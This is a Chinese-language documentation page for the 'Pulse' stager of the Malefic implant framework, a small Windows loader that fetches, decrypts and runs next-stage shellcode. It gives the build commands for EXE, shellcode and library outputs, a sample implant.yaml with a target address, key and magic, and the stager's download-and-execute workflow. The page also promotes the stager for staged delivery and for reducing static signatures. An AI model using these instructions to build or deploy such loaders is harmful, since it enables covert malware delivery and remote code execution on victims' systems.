---
title: Pulse 构建
description: Pulse 对应 malefic-pulse 包，是一个 nostd Windows stager。它的生成代码负责连接服务器、下载加密载荷、校验
  magic、解密并执行下一阶段 shellcode。
edition: community
generated: false
source: imp:build/pulse.md
---

# Pulse 构建

Pulse 对应 `malefic-pulse` 包，是一个 `no_std` Windows stager。它的生成代码负责连接服务器、下载加密载荷、校验 magic、解密并执行下一阶段 shellcode。

## 关联组件

| 组件 | 作用 |
|------|------|
| [Pulse 组件](/malefic/getting-started/components/pulse/) | 说明 stager 的定位、协议支持、magic 校验与 shellcode 输出 |
| [Mutant 组件](/malefic/getting-started/components/mutant/) | 负责读取 `pulse` 配置并生成 `malefic-pulse` 传输代码 |
| [Malefic 构建](/malefic/build/malefic/) | Pulse 通常用于拉取完整 Malefic beacon |

## 使用方式

Pulse 适合分阶段投递：先投递小体积 stager，再由 stager 拉取完整 payload。典型用法：

- 作为 loader 的第一阶段 shellcode。
- 通过 HTTP/HTTPS 拉取 beacon 或 prelude。
- 在需要较小初始载荷、减少静态特征时使用。

## 生成 Pulse

```bash
malefic-mutant generate pulse -c implant.yaml --arch x64 --platform win
```

`generate pulse` 只读取 `implant.yaml` 顶层 `pulse` section。它会校验 `pulse.protocol` 和 `pulse.api_type`，然后选择对应生成器：

| `pulse.protocol` | `pulse.api_type` | 生成器 | TLS |
|------------------|------------------|--------|-----|
| `tcp` | 任意值 | `build/pulse/tcp.rs` | 否 |
| `http` | 空或 `raw` | `build/pulse/http.rs` | 否 |
| `http` | `winhttp` | `build/pulse/winhttp.rs` | 否 |
| `https` | `winhttp` | `build/pulse/winhttp.rs` | 是 |
| `http` | `wininet` | `build/pulse/wininet.rs` | 否 |
| `https` | `wininet` | `build/pulse/wininet.rs` | 是 |

Raw HTTP 不支持 TLS；`https` 必须搭配 `winhttp` 或 `wininet`。`https + raw` 会在生成阶段报错。

## 构建 EXE

```bash
malefic-mutant build pulse -c implant.yaml -t x86_64-pc-windows-gnu
```

默认输出：

```text
target/x86_64-pc-windows-gnu/release/malefic-pulse.exe
```

Pulse 构建只支持 Windows target。`build/payload/mod.rs` 中的 `normalize_build_kind` 会拒绝非 Windows target。

## 构建 Shellcode

```bash
malefic-mutant build pulse --shellcode -c implant.yaml -t x86_64-pc-windows-gnu
```

`--shellcode` 会启用 `shellcode` feature，构建 PE 后使用 `PEObjCopy::extract_binary` 提取 `.text` 段：

```text
target/x86_64-pc-windows-gnu/release/malefic-pulse.bin
```

Shellcode 模式需要 PE executable 输入，因此会强制走 binary 构建路径，不应与 `--lib` 混用。

## 构建为库

`malefic-pulse/Cargo.toml` 定义了 `staticlib`、`cdylib` 和 `rlib` 输出：

```bash
malefic-mutant build --lib pulse -c implant.yaml -t x86_64-pc-windows-gnu
```

库构建适合被其他工程链接或嵌入；如果目标是直接投递 shellcode，使用 `--shellcode`。

## `implant.yaml` 的 `pulse` section

```yaml
pulse:
  flags:
    start: 65
    end: 66
    magic: beautiful
    artifact_id: 0
  encryption: xor
  key: maliceofinternal
  target: 127.0.0.1:80
  protocol: http
  api_type: raw
  http:
    method: POST
    path: /pulse
    host: 127.0.0.1
    version: "1.1"
    headers:
      User-Agent: Mozilla/5.0
```

字段约束：

- `protocol` 支持 `tcp`、`http`、`https`。
- `api_type` 支持 `raw`、`winhttp`、`wininet`，空字符串默认 `raw`。
- `https` 不支持 `raw`。
- `flags.start` / `flags.end` 在配置结构中是 `u32`，运行时按 `u8` 使用。

## CLI 参数

### generate

| 参数 | 默认值 | 说明 |
|------|--------|------|
| `-a/--arch` | `x64` | 架构：`x64` 或 `x86` |
| `-p/--platform` | `win` | 平台；Pulse 当前仅 Windows 有意义 |

### build

| 参数 | 说明 |
|------|------|
| `--shellcode` | 构建后提取 `.text` 为 `.bin` |
| `--lib` | 构建 library target |
| `-t/--target` | Rust target triple |

## 工作流程

`malefic-pulse/src/lib.rs` 是 `no_std` library。`generate pulse` 写入传输代码后，Pulse 会：

1. 连接 `pulse.target`。
2. 按协议拉取加密 payload。
3. 用 `pulse.key` 解密。
4. 用 `pulse.flags` 校验数据边界和 magic。
5. 执行下载得到的下一阶段 shellcode。

## 相关文档

- [构建概览](/malefic/build/)
- [Mutant 组件](/malefic/getting-started/components/mutant/)
- [Pulse 组件](/malefic/getting-started/components/pulse/)
- [Malefic 构建](/malefic/build/malefic/)
